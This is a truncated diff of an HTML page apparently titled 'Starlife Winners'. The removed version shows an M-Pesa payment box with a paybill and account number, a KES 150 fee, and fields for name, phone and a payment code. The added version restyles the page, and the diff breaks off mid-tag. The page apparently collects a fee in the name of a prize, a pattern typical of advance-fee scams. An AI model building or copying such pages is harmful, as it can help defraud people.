@@ -2,34 +2,32 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>STARLIFE WINNERS</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Starlife Wins</title>
 <style>
-body{background:#0a0a0a;color:white;font-family:Arial;margin:0}
-.h{padding:12px;background:#111;display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid #ffcc00}
-.logo{color:#ffcc00;font-weight:bold;font-size:20px}
-.main{padding:16px;max-width:500px;margin:auto}
-.c{background:#151515;border:1px solid #333;border-radius:12px;padding:16px;margin-bottom:16px}
-.payBox{background:#1a1a0a;border:1px solid #ffcc00;border-radius:10px;padding:14px;text-align:center;line-height:1.8}
-.mpesaBox{background:#0f1f0f;border-radius:8px;padding:12px;margin-top:12px}
-input{width:100%;padding:12px;margin:8px 0;border:1px solid #333;border-radius:8px;background:#222;color:white;box-sizing:border-box;font-size:16px}
-button{width:100%;padding:14px;border:none;border-radius:8px;font-weight:bold;font-size:16px;cursor:pointer;margin-top:8px}
-.btn-pay{background:#00a651;color:white}
-#msg{text-align:center;font-weight:bold;margin-top:12px;display:none}
-.amount{color:#00ff66;font-size:22px;font-weight:bold}
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
+body{background:#060a14;color:#fff;min-height:100vh}
+.page{display:none;min-height:100vh;padding:20px}
+.active{display:block}
+.center{max-width:420px;margin:0 auto;padding-top:30px}
+.logo{text-align:center;margin-bottom:25px}
+.logo h1{font-size:32px;background:linear-gradient(90deg,#00f5ff,#7c3aed);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900}
+.logo p{opacity:0.5;font-size:13px;margin-top:5px}
+.card{background:linear-gradient(135deg,rgba(255,255,255,0.07),rgba(255,255,255,0.02));border:1px solid rgba(255,255,255,0.09);border-radius:18px;padding:18px;margin-bottom:14px;position:relative;overflow:hidden}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--c,#00f5ff)}
+.card p{font-size:11px;opacity:0.55;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}
+.card h3{font-size:24px;font-weight:800}
+.card small{font-size:11px;opacity:0.5;display:block;margin-top:5px}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px}
+.input{width:100%;padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.15);background:rgba(0,0,0,0.35);color:#fff;outline:none;margin-bottom:12px}
+.btn{width:100%;padding:14px;border:none;border-radius:12px;background:linear-gradient(90deg,#00f5ff,#7c3aed);color:#fff;font-weight:bold;cursor:pointer;font-size:15px}
+.btn2{background:rgba(255,255,255,0.07);border:1px solid rgba(255,255,255,0.1)}
+.linkbox{background:rgba(0,245,255,0.08);border:1px dashed rgba(0,245,255,0.3);border-radius:14px;padding:14px;text-align:center;margin-top:18px;word-break:break-all}
+.linkbox a{color:#00f5ff;text-decoration:none;font-weight:bold;font-size:13px}
+.badge{display:inline-block;padding:4px 8px;border-radius:20px;font-size:10px;background:rgba(0,245,255,0.15);color:#00f5ff;margin-left:6px}
+.paybox{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:16px;padding:16px;margin:16px 0}
 </style>
 </head>
 <body>
-<div class="h"><div class="logo">★ STARLIFE WINNERS</div></div>
-<div class="main">
-<div class="c">
-<div class="payBox">
-<b>LIPA NA M-PESA</b><br>
-Paybill: <b>714777</b><br>
-Account: <b>440200282954</b><br>
-Amount: <span class="amount">KES 150</span>
-</div>
-<div class="mpesaBox">
-<input id="name" placeholder="Your Full Name">
-<input id="phone" placeholder="M-Pesa Phone 07...">
-<input id="code
+
+<div id="reg
